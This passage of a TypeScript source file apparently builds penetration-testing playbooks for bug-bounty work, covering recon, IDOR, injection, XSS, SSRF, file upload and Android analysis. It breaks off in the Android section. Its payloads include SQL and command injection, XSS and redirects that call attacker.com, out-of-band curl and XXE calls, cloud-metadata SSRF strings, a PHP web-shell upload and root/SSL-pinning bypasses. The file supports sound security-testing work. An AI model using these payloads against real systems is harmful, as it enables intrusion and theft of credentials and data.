import type {
  ChecklistCategory,
  ChecklistDomain,
  ChecklistItem,
  TestingMethod,
} from "../types/checklist";

/**
 * Provides comprehensive, multi-method testing playbooks for any checklist item.
 * If the item defines its own custom methods, those take precedence.
 * Otherwise, domain- and category-aware methodologies are generated.
 */
export function getItemPlaybook(
  item: ChecklistItem,
  category: ChecklistCategory,
  domain: ChecklistDomain
): {
  methods: TestingMethod[];
} {
  const existingMethods = item.methods && item.methods.length > 0 ? item.methods : null;

  // Generate category- and domain-tailored methods if not explicitly set
  const methods: TestingMethod[] =
    existingMethods || generateMethodsForCategory(item, category, domain);

  return { methods };
}

function generateMethodsForCategory(
  item: ChecklistItem,
  category: ChecklistCategory,
  domain: ChecklistDomain
): TestingMethod[] {
  const basePayload = item.payloads?.[0] || "";
  const catId = category.id.toLowerCase();
  const catName = category.name.toLowerCase();

  // ROUTE ANDROID DOMAIN TO DEDICATED ANDROID PLAYBOOKS
  if (domain.id === "android" || catId.startsWith("android-")) {
    return generateAndroidPlaybookMethods(item, category);
  }

  // 1. RECONNAISSANCE, SUBDOMAINS, OSINT & DISCOVERY
  if (
    catId.includes("recon") ||
    catId.includes("subdomain") ||
    catId.includes("osint") ||
    catId.includes("dns") ||
    catId.includes("port") ||
    catId.includes("discovery") ||
    catName.includes("subdomain") ||
    catName.includes("recon") ||
    catName.includes("information gathering")
  ) {
    return [
      {
        title: "Method 1: Multi-Source Passive OSINT Aggregation",
        scenario: "Harvesting subdomains and exposed assets without sending direct packets to the target.",
        tools: ["subfinder", "amass", "crt.sh", "crt.name"],
        steps: [
          "Run subfinder across all configured passive API sources: `subfinder -d target.com -all -o passive_subs.txt`.",
          "Query fast Certificate Transparency logs via crt.name: `curl -s 'https://crt.name/v1/search?apex=target.com' | sort -u`.",
          "Query crt.sh for wildcards and JSON extraction: `curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u`.",
          "Combine passive lists and deduplicate to form the initial seed domain inventory.",
        ],
        payloads: [
          "subfinder -d target.com -all -o subs.txt",
          "curl -s 'https://crt.name/v1/search?apex=target.com' | sort -u",
          "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u",
        ],
        tips: "Configure free API keys in subfinder (Chaos, SecurityTrails, Shodan, Censys) to 3x your passive discovery yield.",
      },
      {
        title: "Method 2: Active DNS Wordlist Brute-Force & Trusted Resolvers",
        scenario: "Discovering unlinked internal, staging, and hidden hosts using trusted DNS resolvers.",
        tools: ["puredns", "shuffledns", "resolvers.txt"],
        steps: [
          "Download a fresh, trusted resolver list (e.g. from trickest/resolvers).",
          "Run active brute-forcing using a high-signal wordlist: `puredns bruteforce best-dns-wordlist.txt target.com -r resolvers.txt -w resolved.txt`.",
          "Validate wildcard DNS response filtering to prevent false positive host registrations.",
        ],
        payloads: [
          "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w resolved.txt",
          "dnsx -l subs.txt -resp -silent",
        ],
        tips: "Always check for wildcard DNS (*.target.com resolving to a generic parking IP) before active brute-forcing.",
      },
      {
        title: "Method 3: Pattern Permutations & Alterations (alterx)",
        scenario: "Predicting internal staging and development naming patterns from discovered subdomains.",
        tools: ["alterx", "dnsx"],
        steps: [
          "Feed discovered subdomains into alterx to generate permutations: `alterx -l known_subs.txt -o permutations.txt`.",
          "Resolve the generated permutations using dnsx: `cat permutations.txt | dnsx -silent -o live_permutations.txt`.",
          "Focus on live hits containing prefixes: dev-, staging-, internal-, v1-, qa-, test-.",
        ],
        payloads: [
          "alterx -l known_subs.txt | dnsx -silent",
          "altdns -i known_subs.txt -o data_output -w words.txt -r -s results_output.txt",
        ],
        tips: "Development naming schemes like `api-staging.target.com` often skip WAF and cloud protection layers.",
      },
      {
        title: "Method 4: HTTP Status Probing & Virtual Host (VHost) Routing",
        scenario: "Checking live web services, technologies, title banners, and routing discrepancies.",
        tools: ["httpx", "ffuf (VHost mode)"],
        steps: [
          "Probe all resolved domains for HTTP/HTTPS services: `httpx -l resolved.txt -title -tech-detect -status-code -follow-redirects`.",
          "Identify hosts returning 401, 403, or default server splash pages (Nginx, Apache, Tomcat).",
          "Test for virtual host routing by modifying the `Host` header against known target IP addresses.",
        ],
        payloads: [
          "httpx -l subs.txt -status-code -title -tech-detect -web-server",
          "ffuf -u http://TARGET_IP/ -H 'Host: FUZZ.target.com' -w subs.txt -fs 1234",
        ],
        tips: "VHosts behind CDNs frequently respond directly when sending the internal Host header to the origin IP.",
      },
    ];
  }

  // 2. IDOR / Access Control / Authorization
  if (
    catId.includes("idor") ||
    catId.includes("access") ||
    catId.includes("bopla") ||
    catId.includes("privesc") ||
    catId.includes("rbac") ||
    catName.includes("access control") ||
    catName.includes("authorization")
  ) {
    return [
      {
        title: "Method 1: Two-Account Browser Proxy Interception",
        scenario: "Classic cross-tenant IDOR where User A modifies or accesses User B's resource.",
        tools: ["Burp Suite / Caido", "Two Separate Browser Profiles (Containers)"],
        steps: [
          "Log into User A (Attacker) in Browser Window 1 and User B (Victim) in Browser Window 2 (or Firefox Multi-Account Containers).",
          "Perform the target action (view invoice, edit profile, delete project) with User B and capture the raw HTTP request in Burp Suite.",
          "Identify all object reference parameters: numeric IDs (e.g. id=1054), UUIDs (uuid=3f8c...), usernames, or email addresses.",
          "Send the captured request to Burp Repeater. Replace User B's session cookie / Authorization Bearer token with User A's token.",
          "Send the request and verify if the server returns 200 OK with User B's private data or modifies User B's record.",
        ],
        payloads: [
          "GET /api/v1/users/USER_B_ID HTTP/1.1\nAuthorization: Bearer <USER_A_TOKEN>",
          "POST /api/v1/projects/delete\n{\"project_id\": \"VICTIM_PROJECT_UUID\"}",
        ],
        tips: "Always check if the object identifier appears in query params, request body JSON, or custom headers (e.g. X-Tenant-Id, X-User-Id).",
      },
      {
        title: "Method 2: HTTP Verb / Method Substitution & Path Traversal",
        scenario: "When direct GET or POST is blocked by an API gateway or authorization filter.",
        tools: ["Burp Repeater", "cURL"],
        steps: [
          "If GET /api/documents/1054 returns 403 Forbidden, change the HTTP verb to POST, PUT, PATCH, or HEAD.",
          "Test HTTP method overriding headers: add 'X-HTTP-Method-Override: GET' or '_method=GET'.",
          "Attempt path parameter traversal: request '/api/documents/me/..;/1054' or '/api/documents/%2e%2e/1054'.",
          "Check for alternative API version routes (e.g. changing /v2/ to /v1/ or /internal/).",
        ],
        payloads: [
          "POST /api/documents/1054 HTTP/1.1\nX-HTTP-Method-Override: GET",
          "GET /api/users/me/../victim_user_id HTTP/1.1",
        ],
        tips: "Many microservice architectures enforce RBAC only on specific HTTP verbs, leaving PUT or DELETE unprotected.",
      },
      {
        title: "Method 3: JSON Array & Type Confusion Injection",
        scenario: "Bypassing object validation filters via type juggling.",
        tools: ["Burp Repeater", "Postman / Bruno"],
        steps: [
          "If the API accepts JSON `{\"user_id\": 1054}`, change the integer to a string: `{\"user_id\": \"1054\"}`.",
          "Wrap the target ID inside an array: `{\"user_id\": [1054]}` or nested object: `{\"user_id\": {\"id\": 1054}}`.",
          "Check if backend database query framework (MongoDB, Sequelize, Prisma) performs loose type evaluation.",
        ],
        payloads: [
          "{\"account_id\": [1054]}",
          "{\"account_id\": {\"$gt\": 0}}",
        ],
        tips: "NoSQL databases frequently treat JSON objects as query operators if types are not strictly validated.",
      },
      {
        title: "Method 4: Automated Bulk Enumeration via Burp Intruder / ffuf",
        scenario: "Testing predictable sequential IDs for systemic data exposure.",
        tools: ["Burp Intruder / Caido Automate", "ffuf"],
        steps: [
          "Capture a valid request containing an ID parameter (e.g. invoice_id=2000).",
          "Send to Intruder or ffuf. Set the ID parameter as the payload marker: `invoice_id=§2000§`.",
          "Configure Numbers payload type (e.g. 1950 to 2050, step 1).",
          "Analyze responses for consistent HTTP 200 responses with differing Content-Lengths, indicating access to other accounts' invoices.",
        ],
        payloads: [
          "ffuf -u 'https://example.com/api/invoices/FUZZ' -H 'Authorization: Bearer <TOKEN>' -w numbers.txt -mc 200",
        ],
        tips: "Filter out false positives by matching response status 200 and excluding responses matching your own account's content length.",
      },
    ];
  }

  // 3. INJECTION (SQLi, NoSQLi, Command, SSTI)
  if (
    catId.includes("inject") ||
    catId.includes("sqli") ||
    catId.includes("sql") ||
    catId.includes("nosql") ||
    catId.includes("cmd") ||
    catId.includes("command") ||
    catId.includes("ssti") ||
    catId.includes("xxe") ||
    catName.includes("injection")
  ) {
    return [
      {
        title: "Method 1: Manual Context Breaking & Syntax Error Triggering",
        scenario: "Detecting backend parser errors and unescaped input reflections.",
        tools: ["Burp Suite Repeater", "Browser DevTools"],
        steps: [
          "Locate all parameters reflected in backend queries, commands, or database lookups.",
          "Inject individual context-breaking characters: single quote ('), double quote (\"), backtick (`), semicolon (;), pipe (|), and closing tags.",
          "Observe HTTP response status, error banners (e.g. ORA-, syntax error, uncaught exception), or differences in response body length.",
          "Test basic arithmetic tautology payloads to verify Boolean logic (e.g. ' OR 1=1 vs ' OR 1=2).",
        ],
        payloads: [
          basePayload || "' OR 1=1 --",
          "test' OR '1'='1",
          "`whoami` || ping -c 3 127.0.0.1",
        ],
        tips: "Always test both URL query parameters and JSON body keys, including numeric fields.",
      },
      {
        title: "Method 2: Time-Based Blind Differential Probing",
        scenario: "When the application suppresses database errors and produces identical response bodies.",
        tools: ["Burp Repeater", "cURL with time measurement"],
        steps: [
          "Inject time-delay payloads specific to the suspected engine (sleep(5), pg_sleep(5), WAITFOR DELAY '0:0:5').",
          "Observe response timing: a delay matching your injected duration confirms code execution in the backend engine.",
          "Repeat with sleep(0) or false conditionals to verify the delay was caused by your payload, not network latency.",
        ],
        payloads: [
          "'; WAITFOR DELAY '0:0:5'--",
          "\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
          "{{range .}}{{.sleep(5000)}}{{end}}",
        ],
        tips: "Ensure network jitter is accounted for; run 3 trials with sleep(5) and 3 trials with sleep(0) to confirm consistency.",
      },
      {
        title: "Method 3: Out-of-Band (OOB / Blind AST) Interaction",
        scenario: "Triggering external DNS/HTTP lookups from backends isolated behind firewalls.",
        tools: ["Burp Collaborator", "ProjectDiscovery interactsh-client"],
        steps: [
          "Generate a unique Collaborator/Interactsh hostname (e.g. `xyz.oast.pro`).",
          "Inject payloads instructing the backend to perform a DNS lookup or HTTP request to your listener.",
          "Monitor Collaborator polls for incoming DNS or HTTP connections containing query substrings.",
        ],
        payloads: [
          "'; EXEC master..xp_dirtree '//xyz.oast.pro/a'--",
          "; curl http://xyz.oast.pro #",
          "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://xyz.oast.pro/x\"> %remote;]>",
        ],
        tips: "DNS queries frequently bypass egress firewalls that block outbound HTTP/HTTPS connections.",
      },
      {
        title: "Method 4: Automated Tool Verification (sqlmap / commix)",
        scenario: "Verifying and escalating confirmed injection points safely.",
        tools: ["sqlmap", "commix"],
        steps: [
          "Save the raw HTTP request from Burp into a text file `req.txt`.",
          "Run sqlmap or commix with non-destructive flags: `sqlmap -r req.txt --batch --dbs`.",
          "Verify the injectable parameter and note the backend DBMS version and current user privileges.",
        ],
        payloads: [
          "sqlmap -r req.txt -p target_param --current-user --current-db --batch",
        ],
        tips: "Never run destructive commands or write web shells unless explicitly authorized by the program's rules of engagement.",
      },
    ];
  }

  // 4. XSS (Cross-Site Scripting)
  if (catId.includes("xss") || catName.includes("cross-site scripting")) {
    return [
      {
        title: "Method 1: Context-Specific Manual Polyglot Testing",
        scenario: "Identifying exact reflection context (HTML body, attribute, script tag, or template literal).",
        tools: ["Browser DevTools (Elements Inspector)", "Burp Suite Repeater"],
        steps: [
          "Inject a benign unique canary string: `xsscheck1234`.",
          "Inspect page source to identify where `xsscheck1234` lands: between HTML tags, inside an `<input value=\"...\">` attribute, or inside a `<script>` tag.",
          "Craft the escape string matching that specific syntax context (e.g. `\"><script>` for attributes, `</script><script>` for script blocks).",
          "Inject modern executable proof of concept: `<svg onload=alert(document.domain)>` or `<img src=x onerror=alert(1)>`.",
        ],
        payloads: [
          "\"><svg/onload=alert(document.domain)>",
          "'-alert(document.domain)-'",
          "${alert(document.domain)}",
        ],
        tips: "Look closely at Content-Type: if response is application/json or text/plain, browser won't execute scripts unless rendered via DOM sink.",
      },
      {
        title: "Method 2: DOM-Based Sink & Source Tracing",
        scenario: "Exploiting client-side JavaScript that writes untrusted sources into dangerous sinks.",
        tools: ["Browser Console", "DOM Invader (Burp Suite Embedded Browser)"],
        steps: [
          "Open DevTools Console on the target page.",
          "Search client-side JS for sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`.",
          "Trace if values reach sinks: `element.innerHTML`, `document.write`, `eval()`, `setTimeout()`, `location.href`.",
          "Craft a URL fragment or query parameter payload that feeds malicious HTML directly into the sink without hitting the server.",
        ],
        payloads: [
          "https://example.com/page#<img src=x onerror=alert(document.domain)>",
          "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>",
        ],
        tips: "Enable DOM Invader in Burp's browser to automatically flag sinks that receive controllable inputs.",
      },
      {
        title: "Method 3: WAF Bypass & Filter Mutation",
        scenario: "Evading Cloudflare, AWS WAF, or Akamai string pattern filters.",
        tools: ["Hacker Tools WAF Mutator", "Burp Intruder"],
        steps: [
          "Test which specific characters or keywords trigger the WAF (e.g. `<script>`, `alert`, `onerror`, `onload`).",
          "Substitute prohibited tags with uncommonly filtered tags: `<details/ontoggle=alert(1)>`, `<audio/src/onerror=alert(1)>`.",
          "Use alternative execution vectors: `print()`, `confirm()`, `prompt()`, or top-level navigation: `location='//attacker.com'`.",
        ],
        payloads: [
          "<details open ontoggle=alert(1)>",
          "<svg/onload=import('//attacker.com/xss.js')>",
          "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
        ],
        tips: "HTML entities are decoded automatically by the browser inside tag attributes (like href or src), allowing complete keyword obfuscation.",
      },
    ];
  }

  // 5. SSRF (Server-Side Request Forgery)
  if (catId.includes("ssrf") || catId.includes("cloud-metadata") || catName.includes("ssrf")) {
    return [
      {
        title: "Method 1: Cloud Metadata Probing (AWS / GCP / Azure)",
        scenario: "Exfiltrating IAM credentials or cloud instance tokens via server fetchers.",
        tools: ["Burp Suite Repeater", "cURL"],
        steps: [
          "Identify features that take URLs as input: webhook creators, avatar upload from URL, PDF export, URL previews.",
          "Supply the internal metadata endpoint: `http://169.254.169.254/latest/meta-data/` (AWS) or `http://metadata.google.internal/` (GCP).",
          "Test IP format obfuscations: decimal (2852039166), hex (0xa9fea9fe), IPv6 mapped (::ffff:169.254.169.254).",
          "Inspect server response or generated document for cloud credentials.",
        ],
        payloads: [
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://[::ffff:169.254.169.254]/latest/meta-data/",
          "http://2852039166/latest/meta-data/",
        ],
        tips: "If IMDSv2 is enforced on AWS, test if you can issue PUT requests with token headers or look for GCP/Kubernetes endpoints instead.",
      },
      {
        title: "Method 2: DNS Rebinding & TOCTOU (Time-of-Check to Time-of-Use)",
        scenario: "Bypassing IP address validation checks when server resolves DNS twice.",
        tools: ["rbndr.us", "1u.ms (DNS rebinding service)"],
        steps: [
          "Use a public DNS rebinding service to generate a hostname configured with A record 1.1.1.1 and A record 127.0.0.1 with TTL=0.",
          "Submit the hostname to the target URL preview / fetcher endpoint.",
          "When the backend resolves DNS to validate the IP, it gets 1.1.1.1 (Allowed). When it fetches the content 5ms later, DNS resolves to 127.0.0.1 (Internal target reached).",
        ],
        payloads: [
          "http://7f000001.01010101.rbndr.us/",
          "http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms/",
        ],
        tips: "DNS rebinding is exceptionally effective against custom Python/Node URL validator libraries that don't pin the socket IP address.",
      },
      {
        title: "Method 3: Alternative Protocol & URL Parser Abuse",
        scenario: "Escaping HTTP restrictions using other schemas or parser discrepancies.",
        tools: ["Burp Suite", "Gopherus"],
        steps: [
          "Test non-HTTP URL schemes: `file:///etc/passwd`, `dict://127.0.0.1:6379/info`, `gopher://`.",
          "Exploit URL parser discrepancies using user-info `@` or fragment `#`: `http://allowed.target.com@169.254.169.254/`.",
          "Test redirection chaining: point the target to your external server that returns an HTTP 302 redirecting to `http://127.0.0.1:8080/admin`.",
        ],
        payloads: [
          "file:///etc/passwd",
          "http://google.com#@169.254.169.254/latest/meta-data/",
          "http://attacker.com/302.php?url=http://169.254.169.254",
        ],
        tips: "Many backend HTTP client libraries (like Java HttpURLConnection, Python requests, cURL) follow redirects by default unless explicitly disabled.",
      },
    ];
  }

  // 6. BUSINESS LOGIC & RACE CONDITIONS
  if (
    catId.includes("logic") ||
    catId.includes("race") ||
    catId.includes("rate") ||
    catId.includes("payment") ||
    catId.includes("coupon") ||
    catName.includes("business logic")
  ) {
    return [
      {
        title: "Method 1: Single-Packet HTTP/2 Race Condition Attack",
        scenario: "Exploiting concurrency windows during coupon redemption, voting, or gift card balance consumption.",
        tools: ["Burp Suite Repeater (Parallel Request Group)", "Turbo Intruder"],
        steps: [
          "Capture the state-changing request (e.g. `POST /api/redeem-coupon`).",
          "Send request to Burp Repeater. Add it to a Tab Group with 20 duplicate tabs.",
          "Select 'Send group in parallel (single-packet attack)'. All requests arrive at backend threads within the same millisecond.",
          "Verify if coupon balance was redeemed multiple times simultaneously before database lock was committed.",
        ],
        payloads: [
          "POST /api/coupon/apply\n{\"code\": \"DISCOUNT50\"}",
        ],
        tips: "HTTP/2 single-packet attacks synchronize request arrival across TCP packets, making race condition exploitation near 100% reliable.",
      },
      {
        title: "Method 2: Negative Value & Precision Rounding Manipulation",
        scenario: "Bypassing balance or inventory constraints with negative numbers or tiny fractions.",
        tools: ["Burp Repeater"],
        steps: [
          "Test negative quantities in checkout carts: `{\"quantity\": -1}` or `{\"price\": -100}`.",
          "Test fractional precision: input `0.00000001` or `99999999999999999` to trigger integer overflow.",
          "Check if negative items offset positive cart items, resulting in a zero or negative final order cost.",
        ],
        payloads: [
          "{\"item_id\": 10, \"quantity\": -1}",
          "{\"amount\": 0.001}",
        ],
        tips: "Always check order summary APIs: sometimes the UI shows an error, but the backend order creation API processes negative values.",
      },
      {
        title: "Method 3: Multi-Step Workflow Step Skipping",
        scenario: "Forced browsing through checkout, onboarding, or verification workflows.",
        tools: ["Burp Suite Proxy History", "Repeater"],
        steps: [
          "Map complete workflow sequence: Step 1 (Cart) -> Step 2 (Billing) -> Step 3 (Payment Gateway) -> Step 4 (Order Placed).",
          "Trigger Step 1, then immediately issue the final request for Step 4 without sending Step 2 or Step 3.",
          "Verify if server marks transaction fulfilled without verifying upstream payment completion flags.",
        ],
        payloads: [
          "POST /api/order/complete\n{\"order_id\": \"98214\"}",
        ],
        tips: "Look for parameters like `status=pending` in intermediate steps and change them to `status=paid` or `status=verified`.",
      },
    ];
  }

  // 7. FILE UPLOAD & PATH TRAVERSAL
  if (
    catId.includes("file") ||
    catId.includes("upload") ||
    catId.includes("lfi") ||
    catId.includes("traversal") ||
    catId.includes("rfi") ||
    catName.includes("file")
  ) {
    return [
      {
        title: "Method 1: Extension Polyglots & MIME-Type Spoofing",
        scenario: "Bypassing frontend extension whitelists to execute server-side code.",
        tools: ["Burp Repeater", "Hex Editor"],
        steps: [
          "Capture a legitimate file upload request (e.g. image/png).",
          "Change filename to use alternate extensions: `.php5`, `.phtml`, `.jspx`, `.ashx`, `.phar`.",
          "Test double extensions and null bytes: `shell.php.png`, `shell.png.php`, `shell.php%00.png`.",
          "Keep `Content-Type: image/png` while file body contains PHP/JSP server-side code.",
        ],
        payloads: [
          "filename=\"avatar.php.png\"",
          "filename=\"avatar.phtml\"",
          "Content-Type: image/png\n\n<?php phpinfo(); ?>",
        ],
        tips: "Check where uploaded files are served: if served from S3 or an isolated CDN domain, RCE is mitigated but XSS may remain.",
      },
      {
        title: "Method 2: Magic Bytes Prepending & EXIF Payload Injection",
        scenario: "Bypassing server-side image verification libraries (ImageMagick, GD).",
        tools: ["exiftool", "Burp Suite"],
        steps: [
          "Embed code inside image metadata: `exiftool -Comment='<?php phpinfo(); ?>' valid.jpg`.",
          "Or prepend valid GIF89a magic bytes before payload: `GIF89a; <?php phpinfo(); ?>`.",
          "Upload file and browse directly to its uploaded path to verify code interpretation.",
        ],
        payloads: [
          "GIF89a;<?php system($_GET['cmd']); ?>",
        ],
        tips: "If the server converts or re-encodes images upon upload, EXIF comments will be stripped unless polyglot format survives re-compression.",
      },
      {
        title: "Method 3: Filename Directory Traversal Path Injection",
        scenario: "Overwriting arbitrary files on the filesystem during upload.",
        tools: ["Burp Repeater"],
        steps: [
          "Inject traversal sequences in the filename attribute: `filename=\"../../../../var/www/html/shell.php\"`.",
          "Test URL-encoded and Unicode traversals: `..%2f..%2f`, `..%252f..%252f`, `..%c0%af`.",
          "Verify if the file gets written outside the designated upload directory.",
        ],
        payloads: [
          "filename=\"../../../tmp/poc.txt\"",
          "filename=\"..\\..\\..\\inetpub\\wwwroot\\poc.aspx\"",
        ],
        tips: "Even if code execution is blocked, overwriting SSH authorized_keys or cron files achieves full server control.",
      },
    ];
  }

  // 8. DEFAULT COMPREHENSIVE PLAYBOOK FOR ALL OTHER CHECKS
  return [
    {
      title: "Method 1: Manual Step-by-Step Interception & Parameter Manipulation",
      scenario: "Primary manual verification using an intercepting HTTP proxy.",
      tools: ["Burp Suite / Caido", "Browser Developer Tools"],
      steps: [
        "Enable proxy interception and trigger the target action in the application.",
        "Locate the primary HTTP request in HTTP History and send to Repeater.",
        `Follow specific test guidance: ${item.how}`,
        basePayload ? `Inject test payload: ${basePayload}` : "Manipulate request fields, headers, and parameters.",
        item.expectedResponse
          ? `Verify response against indicator: Vulnerable if "${item.expectedResponse.vulnerable}".`
          : "Analyze response code, headers, and body for discrepancies.",
      ],
      payloads: item.payloads && item.payloads.length > 0 ? item.payloads.slice(0, 3) : undefined,
      tips: "Always capture baseline legitimate responses first so you can clearly diff behavior when manipulating inputs.",
    },
    {
      title: "Method 2: CLI & Scripted Command-Line Reproduction",
      scenario: "Reproducing findings cleanly for Bug Bounty Proof-of-Concept submissions.",
      tools: ["cURL", "HTTPie", "Terminal / Bash"],
      steps: [
        "Right-click the request in Burp Suite and select 'Copy as cURL'.",
        "Paste into terminal and test variations rapidly using flags (-i for headers, -s for silent).",
        "Automate parameter iterations using bash loops or small Python scripts.",
        "Document exact terminal output to attach to your bug report.",
      ],
      payloads: basePayload ? [`curl -i -X POST https://example.com/target -d "${basePayload}"`] : undefined,
      tips: "Triage teams on HackerOne and Bugcrowd love clean cURL commands because they can reproduce in seconds without setting up Burp.",
    },
    {
      title: "Method 3: Boundary Testing, Edge-Cases & Header Variations",
      scenario: "Testing non-standard inputs, header overrides, and bypass techniques.",
      tools: ["Burp Repeater", "Postman / Bruno"],
      steps: [
        "Test with boundary values: null bytes (%00), large strings (buffer limits), empty values, negative numbers.",
        "Inject custom headers: 'X-Forwarded-For: 127.0.0.1', 'X-Original-URL: /admin', 'X-Custom-IP-Authorization: 127.0.0.1'.",
        "Change Content-Type header (e.g. from application/json to application/x-www-form-urlencoded or text/plain).",
      ],
      payloads: [
        "X-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost",
        "Content-Type: application/x-www-form-urlencoded",
      ],
      tips: "WAFs and API gateways often apply inspection rules only to expected Content-Types, ignoring unconventional ones.",
    },
    {
      title: "Method 4: Multi-Role Authorization & Session State Testing",
      scenario: "Testing permission boundaries and access controls across user roles.",
      tools: ["Burp Suite Session Handling Rules / Autorize Extension"],
      steps: [
        "Test the endpoint with: (1) High-privilege role, (2) Low-privilege role, (3) Unauthenticated anonymous request.",
        "Check if removing authorization headers (Cookie, Authorization) returns the same data.",
        "Test if an expired or invalid token is rejected or silently accepted.",
      ],
      tips: "Use Burp extension 'Autorize' to test authorization across all browsed endpoints in the background automatically.",
    },
  ];
}

function generateAndroidPlaybookMethods(
  item: ChecklistItem,
  category: ChecklistCategory
): TestingMethod[] {
  const catId = category.id.toLowerCase();
  const basePayload = item.payloads?.[0] || "";

  // 1. ANDROID STATIC ANALYSIS
  if (catId.includes("static")) {
    return [
      {
        title: "Method 1: JADX-GUI & APKTool Bytecode & Manifest Audit",
        scenario: "Decompiling DEX bytecode, reviewing AndroidManifest.xml permissions and exported components.",
        tools: ["jadx-gui", "apktool", "apkanalyzer"],
        steps: [
          "Decompile APK bytecode into readable Java sources: `jadx -d out_src app.apk` or unpack resources with `apktool d app.apk -o apktool_out`.",
          "Inspect AndroidManifest.xml for insecure flags (`android:debuggable=\"true\"`, `android:allowBackup=\"true\"`).",
          "Identify all exported activities, services, broadcast receivers, and content providers lacking permission attributes.",
          "Grep decompiled source and `res/values/strings.xml` for leaked secrets, API keys, and sensitive internal endpoints.",
        ],
        payloads: [
          "jadx -d out_src app.apk",
          "apkanalyzer manifest print app.apk | grep -A2 'android:exported=\"true\"'",
          "grep -rEi '(api[_-]?key|secret|token|password|AIza[0-9A-Za-z_-]{35})' out_src/",
        ],
        tips: "Use JADX-GUI's 'Text Search' (Ctrl+Shift+F) with regex to search for patterns like `AIza[0-9A-Za-z_-]{35}` or `jwt|bearer|secret`.",
      },
      {
        title: "Method 2: Automated Static Secret & Config Scanning",
        scenario: "Automating heuristic secret detection, security misconfigurations, and third-party library CVEs.",
        tools: ["MobSF", "apkleaks", "semgrep"],
        steps: [
          "Run APKLeaks on the APK file to extract URLs, endpoints, and credentials: `apkleaks -f app.apk -o apkleaks.txt`.",
          "Spin up MobSF docker container: `docker run -it --rm -p 8000:8000 opensecurity/mobsf:latest` and upload the APK.",
          "Scan decompiled Java code with Semgrep rules for mobile security: `semgrep --config=p/mobile-android out_src/`.",
        ],
        payloads: [
          "apkleaks -f app.apk -o apkleaks_results.txt",
          "semgrep --config=p/mobile-android out_src/",
        ],
        tips: "Always manually verify findings flagged by automated tools — many API keys (like Google Maps client key) are public by design unless restricted improperly.",
      },
      {
        title: "Method 3: WebView Implementation & Bridge Audit",
        scenario: "Auditing WebViews for JavaScript bridges, file URL access, and domain validation bypasses.",
        tools: ["jadx-gui", "grep"],
        steps: [
          "Search decompiled code for `addJavascriptInterface` calls exposing native Java objects to JavaScript.",
          "Verify WebView settings: ensure `setAllowFileAccessFromFileURLs` and `setAllowUniversalAccessFromFileURLs` are disabled.",
          "Audit URL whitelists in `shouldOverrideUrlLoading` or `shouldInterceptRequest` for open redirect or bridge invocation flaws.",
        ],
        payloads: [
          "grep -rn \"addJavascriptInterface\" out_src/",
          "<script>alert(Object.keys(window.AndroidBridge))</script>",
        ],
        tips: "If `addJavascriptInterface` is used on an Android app targeting API < 17, it leads to arbitrary remote code execution via reflection.",
      },
      {
        title: "Method 4: CLI Manifest & Permission Analysis",
        scenario: "Inspecting APK metadata, requested permissions, and component declarations directly via terminal.",
        tools: ["aapt", "adb shell"],
        steps: [
          "Dump badging and metadata: `aapt dump badging app.apk`.",
          "List all declared and requested permissions: `aapt dump permissions app.apk`.",
          "Check if app attempts to use dangerous permissions (SMS, contacts, camera, location) without legitimate business need.",
        ],
        payloads: [
          "aapt dump badging app.apk | grep -iE 'debuggable|permission'",
          "adb shell dumpsys package <package> | grep -A20 'requested permissions'",
        ],
        tips: "Apps targeting modern Android (API 33+) must request runtime permissions explicitly; check if the app degrades gracefully if denied.",
      },
    ];
  }

  // 2. ANDROID DYNAMIC ANALYSIS
  if (catId.includes("dynamic")) {
    return [
      {
        title: "Method 1: Frida Runtime Hooking & Method Tracing",
        scenario: "Dynamically inspecting runtime behavior, overriding method returns, and tracing sensitive API calls.",
        tools: ["Frida", "frida-tools", "frida-server"],
        steps: [
          "Push and start frida-server on rooted device/emulator: `adb shell '/data/local/tmp/frida-server &' &`.",
          "Spawn application with custom Frida script: `frida -U -f <package> -l hook.js --no-pause`.",
          "Hook sensitive functions (e.g. login checks, password verifications) and modify arguments or return true.",
          "Trace cryptography and logging functions dynamically: `frida-trace -U -f <package> -j 'javax.crypto.Cipher.*' -j 'android.util.Log.*'`.",
        ],
        payloads: [
          "frida -U -f <package> -l hook.js --no-pause",
          "frida-trace -U -f <package> -j 'javax.crypto.Cipher.doFinal'",
        ],
        tips: "Use `Java.perform(function() { ... })` inside Frida scripts to ensure execution within Android VM context.",
      },
      {
        title: "Method 2: Objection Interactive Exploration",
        scenario: "Zero-scripting interactive REPL exploration for fast runtime analysis and bypasses.",
        tools: ["objection", "adb"],
        steps: [
          "Launch objection session: `objection -g <package> explore`.",
          "Execute instant bypasses: run `android sslpinning disable` and `android root disable`.",
          "Live-watch class methods and arguments: `android hooking watch class_method <class>.<method> --dump-args --dump-return`.",
          "Dump application memory, Keystore entries, and loaded classes.",
        ],
        payloads: [
          "objection -g <package> explore --startup-command 'android sslpinning disable'",
          "objection -g <package> explore --startup-command 'android root disable'",
        ],
        tips: "Objection is ideal for quick testing without writing custom JavaScript code from scratch.",
      },
      {
        title: "Method 3: ADB Intent & Exported Component Invocation",
        scenario: "Bypassing authentication and client-side screens by directly launching internal components via Activity Manager.",
        tools: ["adb shell am", "adb shell pm"],
        steps: [
          "Query package components: `adb shell dumpsys package <package> | grep -A10 'Activity:'`.",
          "Invoke exported activity directly: `adb shell am start -n <package>/<activity>`.",
          "Send extras and intent flags: `adb shell am start -n <package>/<activity> --es 'auth_token' 'bypass' --ez 'is_admin' true`.",
          "Observe if authentication gates or PIN verification screens are completely skipped.",
        ],
        payloads: [
          "adb shell am start -n <package>/<activity>",
          "adb shell am start -a android.intent.action.VIEW -d 'myapp://reset?token=test'",
        ],
        tips: "Activities exported without permissions often assume the user has already passed authentication.",
      },
      {
        title: "Method 4: System Logs & Clipboard Monitoring",
        scenario: "Detecting sensitive data leakage through Android system logging and clipboard mechanisms.",
        tools: ["adb logcat", "adb shell dumpsys"],
